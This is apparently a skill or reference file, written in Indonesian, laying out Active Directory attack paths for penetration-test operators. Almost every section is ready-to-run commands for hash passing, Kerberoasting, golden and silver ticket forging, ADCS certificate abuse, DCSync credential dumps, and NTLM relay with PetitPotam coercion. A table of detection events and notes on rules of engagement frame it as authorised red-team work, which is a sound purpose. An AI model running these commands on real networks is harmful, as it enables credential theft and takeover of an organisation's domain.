---
name: "Windows & Active Directory Attacks — PtH, Kerberos, ADCS"
description: "Jalur serangan Windows dan Active Directory untuk operator berpengalaman: enumerasi domain, Pass-the-Hash dan Overpass-the-Hash, Kerberos (AS-REP, Kerberoast, silver/golden ticket), delegasi, ADCS, DCSync, SMB relay, dan catatan deteksi untuk tiap langkah."
tags: [windows, active-directory, pass-the-hash, kerberos, dcsync, adcs, smb-relay, detection]
---

# Windows & Active Directory Attacks

AD jarang direbut dalam satu langkah. Yang khas adalah rantai: kredensial kecil → hak delegasi → jalur yang BloodHound tunjukkan → domain controller. Nilai operator terletak pada memilih jalur terpendek yang tidak memicu deteksi.

## 1. Enumerasi domain

```powershell
net view /domain
nltest /dclist:$DOMAIN
nltest /domain_trusts
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
Get-ADUser -Filter * -Properties ServicePrincipalNames | ? {$_.ServicePrincipalNames}
Get-ADComputer -Filter * | Select Name,DNSHostName,OperatingSystem
Get-WmiObject -Class Win32_Share
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

Dari Linux, `netexec` (nxc) memberi cakupan lebih luas dan lebih cepat:

```bash
nxc smb 10.10.10.0/24 -u user -p pass --shares --sessions --loggedon-users
nxc ldap $DC -u user -p pass --users --groups --trusted-for-delegation
bloodhound-python -d DOMAIN -u user -p pass -dc $DC -c All
```

## 2. Kredensial tanpa password

**Pass-the-Hash** — NTLM hash cukup untuk autentikasi:

```bash
impacket-wmiexec DOMAIN/USER@TARGET -hashes :NTHASH
nxc smb TARGET -u USER -H NTHASH -x whoami
```

**Overpass-the-Hash** — konversi hash NTLM ke TGT Kerberos, lalu pakai tiket:

```bash
impacket-getTGT DOMAIN/USER -hashes :NTHASH
export KRB5CCNAME=USER.ccache
impacket-psexec -k -no-pass DOMAIN/USER@TARGET
```

## 3. Kerberos

```bash
# AS-REP roasting — akun tanpa pre-auth
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -format hashcat

# Kerberoasting — SPN milik user
impacket-GetUserSPNs DOMAIN/USER:PASS -request -outputfile spn.txt

# Silver ticket — hash akun mesin/layanan
impacket-ticketer -nthash MACHINE_HASH -domain-sid $SID -domain DOMAIN -spn cifs/TARGET Administrator

# Golden ticket — hash krbtgt
impacket-ticketer -nthash KRBTGT_HASH -domain-sid $SID -domain DOMAIN Administrator
```

Pecahkan dengan hashcat mode 13100 (Kerberoast) atau 18200 (AS-REP).

## 4. Delegasi dan ADCS

| Jenis | Ciri | Arah serang |
|---|---|---|
| Unconstrained | `TRUSTED_FOR_DELEGATION` | Coerce auth ke host itu, ambil TGT |
| Constrained | `msDS-AllowedToDelegateTo` | S4U2Self + S4U2Proxy |
| RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` | Tulis atribut di computer object |

ADCS paling sering disalahkonfigurasi. Certipy mengenumerasi dan mengeksploitasi ESC1–ESC8:

```bash
certipy find -u user@domain -p pass -dc-ip $DC -vulnerable
certipy req -u user@domain -p pass -ca CA -template VulnTemplate -upn administrator@domain
certipy auth -pfx administrator.pfx -dc-ip $DC
```

## 5. DCSync dan dump

```bash
impacket-secretsdump DOMAIN/USER:PASS@$DC
nxc smb $DC -u USER -p PASS --ntds
```

DCSync butuh hak replikasi (`DS-Replication-Get-Changes-All`). Ini langkah berdampak tinggi: pastikan ada izin di RoE, ambil hanya yang dibutuhkan, dan jangan menyimpan dump di host target.

## 6. SMB relay dan coercion

Relay berhasil ketika SMB signing tidak wajib dan kredensial bisa dipaksa lewat jaringan:

```bash
# Cek signing
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt

# Relay ke target tanpa signing
impacket-ntlmrelayx -tf relay.txt -smb2support -socks

# Coercion (butuh patch level tertentu)
impacket-PetitPotam.py $ATTACKER $TARGET
```

Relay ke LDAP bisa membuat computer account dan langsung ke RBCD — salah satu rantai tercepat menuju DA.

## 7. Deteksi yang ditinggalkan

| Aksi | Telemetri umum |
|---|---|
| Logon jaringan | 4624 tipe 3, 4768/4769 |
| Kerberoast | 4769 dengan enkripsi RC4 mencurigakan |
| DCSync | 4662 pada GUID replikasi |
| ADCS abuse | 4886/4887, penerbitan sertifikat |
| Relay | 4624 tipe 3 beruntun dari host relay |

Catat telemetri ini di laporan sebagai bagian dari dampak: klien perlu tahu apa yang bisa terdeteksi dan apa yang tidak.

## 8. Best Practices

- BloodHound dulu, eksploitasi kemudian — jalur terpendek biasanya bukan jalur yang paling terlihat.
- Simpan tiket dan hash di workspace terpisah, bukan di host target.
- DCSync dan golden ticket adalah langkah terakhir, dengan izin tertulis.
- Bersihkan objek yang dibuat (computer account, RBCD) sebelum meninggalkan engagement.
- Laporkan setiap langkah beserta bukti dan waktu, bukan hanya hasil akhir.
